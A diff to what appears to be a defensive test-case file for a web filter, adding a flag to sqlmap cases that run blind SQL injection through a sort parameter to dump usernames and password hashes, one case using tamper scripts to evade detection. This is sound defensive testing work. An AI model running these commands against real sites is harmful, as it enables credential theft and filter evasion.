@@ -6,8 +6,10 @@
 # fires sqlmap at the dotted injection point (`posts_post.id*`) with
 # `--level=5 --risk=3`: sqlmap breaks out of the ORDER BY with `)` and finds the
 # boolean/time-based blind injection, then dumps auth_user (verified: admin,
-# jiwoo, minseo). Error-based needs DEBUG, and the app runs DEBUG=False, so the
-# blind techniques are the ones that work. Submitting the dump to /loot/ is a
+# jiwoo, minseo). `--disable-hashing` stops sqlmap offering to crack the dumped
+# pbkdf2 hashes, which `--batch` accepts and which never finishes; with it the
+# dump took 166 s with no WAF (2026-10-10). Error-based needs DEBUG, and the
+# app runs DEBUG=False, so the blind techniques are the ones that work. Submitting the dump to /loot/ is a
 # separate step, not done by the case.
 #
 # Benign cases matter as much as the attacks. Without them a rule that blocks
@@ -66,7 +68,7 @@
   args: ["-u", "{target}/?sort=posts_post.id*",
          "--technique=BT", "--level=5", "--risk=3", "--dbms=mysql",
          "-D", "board", "-T", "auth_user", "-C", "username,password",
-         "--dump", "--batch"]
+         "--dump", "--batch", "--disable-hashing"]
 
 # The same injection with a browser User-Agent and tamper scripts that rewrite
 # spaces, comparison operators and keyword case: a defence that only matches
@@ -83,7 +85,7 @@
          "--technique=BT", "--level=5", "--risk=3", "--dbms=mysql",
          "--random-agent", "--tamper=space2comment,between,randomcase",
          "-D", "board", "-T", "auth_user", "-C", "username,password",
-         "--dump", "--batch"]
+         "--dump", "--batch", "--disable-hashing"]
 
 - name: board-xss-script-tag-in-search
   malicious: true
